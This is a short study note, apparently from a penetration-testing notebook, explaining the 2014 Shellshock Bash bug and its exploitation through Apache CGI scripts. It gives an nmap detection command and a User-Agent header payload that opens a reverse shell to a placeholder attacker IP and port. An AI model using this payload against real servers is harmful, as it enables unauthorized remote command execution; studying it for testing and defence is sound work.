#linux #vulnerability 

Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.

The Shellshock vulnerability is cause by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters: () {:;}; 

In the context of remote exploitation, Apache web servers configure to run CGI scripts or.sh scripts are also vulnerable to this attack.

CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client.

***In order to exploit this vulnerability you will need to locate an input vector or scrip***t that allows you to communicate with Bash.

`nmap script --script=http-shellshock --script-args="http-shellshock.uri=/<file>.cgi"`

You can intercept the http request and in the User-Agent put this characters.

``` bash
() {:;}; echo; /bin/bash -c "bash -i>&/dev/tcp/<ip_local>/<port> 0>&1"
```